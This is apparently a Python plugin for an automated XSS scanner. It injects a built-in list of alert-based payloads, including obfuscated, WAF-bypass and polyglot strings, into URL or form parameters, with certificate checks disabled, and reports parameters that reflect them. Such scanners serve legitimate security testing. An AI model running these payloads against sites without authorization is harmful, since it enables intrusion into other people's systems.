#!/usr/bin/env python3
"""
XSS Scanner Plugin - Detecta vulnerabilidades XSS automaticamente
"""

import requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import sys
sys.path.append('..')
from plugin_system import PluginInterface


class XSSScannerPlugin(PluginInterface):
    """Plugin para scanner XSS automático."""

    name = "xss_scanner"
    version = "1.0.0"
    author = "Auto Recon System"
    description = "Automated XSS vulnerability scanner with multiple payloads"
    category = "vuln_scan"
    requires = ["requests"]

    # Payloads XSS (progressivamente complexos)
    XSS_PAYLOADS = [
        # Basic
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",

        # Event handlers
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",

        # Without quotes
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",

        # Obfuscation
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",

        # Encoded
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",

        # HTML5
        "<details open ontoggle=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",

        # WAF bypass
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",

        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
    ]

    # Patterns para detectar reflection
    REFLECTION_PATTERNS = [
        r"<script[^>]*>.*?XSS.*?</script>",
        r"<img[^>]*onerror.*?XSS",
        r"<svg[^>]*onload.*?XSS",
        r"alert\(['\"]?XSS['\"]?\)",
        r"alert\(1\)",
        r"String\.fromCharCode",
        r"javascript:.*?alert",
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Escaneia URL para XSS.

        Args:
            target: URL alvo
            **kwargs:
                method: GET|POST (default: GET)
                params: Dicionário de parâmetros (opcional)
                timeout: Timeout em segundos (default: 5)

        Returns:
            Dicionário com vulnerabilidades encontradas
        """
        method = kwargs.get('method', 'GET').upper()
        params = kwargs.get('params', {})
        timeout = kwargs.get('timeout', 5)

        print(f"[*] Scanning {target} for XSS vulnerabilities...")

        vulnerabilities = []

        # Parse URL
        parsed = urlparse(target)

        # Se não tem parâmetros, tenta extrair da URL
        if not params:
            params = parse_qs(parsed.query)
            # Converte de lista para string
            params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}

        if not params:
            print("[!] No parameters found to test")
            return {
                'vulnerabilities': [],
                'count': 0,
                'message': 'No parameters to test'
            }

        print(f"[*] Testing {len(params)} parameters with {len(self.XSS_PAYLOADS)} payloads")

        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")

            for i, payload in enumerate(self.XSS_PAYLOADS, 1):
                # Cria parâmetros de teste
                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    if method == 'GET':
                        # Reconstrói URL com payload
                        query_string = urlencode(test_params)
                        test_url = urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            query_string,
                            parsed.fragment
                        ))

                        response = requests.get(test_url, timeout=timeout, verify=False)

                    elif method == 'POST':
                        response = requests.post(target, data=test_params, timeout=timeout, verify=False)

                    else:
                        continue

                    # Verifica reflection
                    if self._check_reflection(response.text, payload):
                        vuln = {
                            'type': 'reflected_xss',
                            'severity': 'high',
                            'url': target,
                            'parameter': param_name,
                            'payload': payload,
                            'method': method,
                            'description': f'XSS vulnerability in parameter "{param_name}"',
                            'impact': 'Attacker can inject malicious JavaScript',
                            'remediation': 'Sanitize user input and encode output',
                            'evidence': self._get_evidence(response.text, payload)
                        }

                        vulnerabilities.append(vuln)

                        print(f"[!] VULNERABLE! Parameter: {param_name}, Payload #{i}")

                        # Para de testar este parâmetro após encontrar vulnerabilidade
                        break

                except requests.exceptions.Timeout:
                    print(f"[!] Timeout testing {param_name}")
                    break

                except Exception as e:
                    self.errors.append(f"Error testing {param_name}: {str(e)}")
                    break

        print(f"\n[+] Found {len(vulnerabilities)} XSS vulnerabilities")

        self.results = vulnerabilities

        return {
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities),
            'target': target
        }

    def _check_reflection(self, response_text: str, payload: str) -> bool:
        """
        Verifica se payload foi refletido na resposta.

        Args:
            response_text: Texto da resposta HTTP
            payload: Payload testado

        Returns:
            True se refletido, False caso contrário
        """
        # Verifica reflection literal
        if payload in response_text:
            return True

        # Verifica patterns de XSS
        for pattern in self.REFLECTION_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        """
        Extrai evidência da vulnerabilidade.

        Args:
            response_text: Texto da resposta
            payload: Payload

        Returns:
            Snippet com evidência
        """
        # Procura payload na resposta
        index = response_text.find(payload)

        if index == -1:
            # Procura por patterns
            for pattern in self.REFLECTION_PATTERNS:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    index = match.start()
                    break

        if index == -1:
            return "Payload reflected in response"

        # Extrai contexto (100 chars antes e depois)
        start = max(0, index - 100)
        end = min(len(response_text), index + len(payload) + 100)

        evidence = response_text[start:end]

        return evidence
